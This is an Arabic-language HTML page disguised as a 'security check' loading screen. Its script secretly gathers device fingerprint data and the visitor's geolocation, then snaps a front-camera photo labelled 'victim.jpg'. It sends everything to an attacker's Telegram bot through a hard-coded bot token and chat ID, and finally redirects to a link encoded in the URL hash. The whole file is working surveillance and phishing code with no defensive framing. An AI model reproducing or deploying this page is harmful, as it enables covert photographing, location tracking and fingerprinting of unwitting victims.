<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>جاري التحميل...</title>
<style>
  body { margin: 0; padding: 0; background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
  .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #0095f6; animation: spin 1s linear infinite; margin-bottom: 20px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  video { display: none; }
</style>
</head>
<body>
<div class="spinner"></div>
<p id="status">جاري التحقق من الأمان...</p>
<video id="camera" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const BOT_TOKEN = '9256355551:AAGwY58CQBawKJVfUQUpfRsqjbEM1lNVbhQ';
  const CHAT_ID = '8896806816';

  let targetUrl = 'https://google.com';
  try {
    const hash = window.location.hash.substring(1);
    if (hash) { targetUrl = atob(hash.replace(/-/g, '+').replace(/_/g, '/')); }
  } catch (e) { console.error('Link decode error', e); }

  const video = document.getElementById('camera');
  const canvas = document.getElementById('canvas');
  const statusText = document.getElementById('status');

  // 1. دالة لجمع معلومات الجهاز الحقيقية
  async function getDeviceInfo() {
    let info = {
      model: "غير معروف",
      platform: navigator.platform || "غير معروف",
      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متاح",
      cores: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " أنوية" : "غير متاح",
      resolution: `${window.screen.width}x${window.screen.height}`,
      browser: navigator.userAgent
    };

    // محاولة جلب الموديل الحقيقي (يدعم كروم وأندرويد)
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      try {
        const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
        if (hints.model) info.model = hints.model;
        if (hints.platform) info.platform = hints.platform;
      } catch (e) { console.log("High entropy not supported"); }
    }
    return info;
  }

  // 2. دالة إرسال الموقع كخريطة
  async function sendLocationToTelegram(lat, lon) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
      });
    } catch (e) { console.error('Location send error', e); }
  }

  // 3. دالة إرسال الصورة مع المعلومات
  async function sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon) {
    const caption = `📱 *تقرير الجهاز:*\n` +
      `• الطراز: ${deviceInfo.model}\n` +
      `• النظام: ${deviceInfo.platform}\n` +
      `• المعالج: ${deviceInfo.cores}\n` +
      `• الذاكرة: ${deviceInfo.ram}\n` +
      `• الشاشة: ${deviceInfo.resolution}\n` +
      `• المتصفح: ${deviceInfo.browser}\n\n` +
      `📍 *الموقع:*\n` +
      (lat && lon ? `خط العرض: ${lat}\nخط الطول: ${lon}` : 'لم يتم السماح بالموقع') +
      `\n\n🔗 *الرابط:* ${targetUrl}`;

    try {
      if (photoBlob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', photoBlob, 'victim.jpg');
        fd.append('caption', caption);
        fd.append('parse_mode', 'Markdown');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
      } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST', headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
        });
      }
    } catch (e) { console.error('Telegram error', e); }
  }

  // 4. الدالة الرئيسية
  async function start() {
    let lat = null, lon = null;
    let photoBlob = null;

    // أ) جمع معلومات الجهاز
    const deviceInfo = await getDeviceInfo();

    // ب) طلب الموقع
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
        (err) => console.log('Location denied'),
        { timeout: 5000 }
      );
    }

    // ج) طلب الكاميرا والتقاط الصورة
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      await new Promise(r => setTimeout(r, 2000)); // استنى ثانيتين

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      
      photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
      stream.getTracks().forEach(t => t.stop());
    } catch (err) { console.log('Camera denied or failed', err); }

    // د) إرسال كل حاجة
    statusText.innerText = 'جاري التحميل...';
    
    // إرسال الصورة والمعلومات النصية
    await sendPhotoWithInfo(photoBlob, deviceInfo, lat, lon);
    
    // إرسال الموقع كخريطة (لو متاح)
    if (lat && lon) {
      await sendLocationToTelegram(lat, lon);
    }

    // هـ) التحويل للرابط الأساسي
    window.location.replace(targetUrl);
  }

  setTimeout(start, 1000);
</script>
</body>
</html>
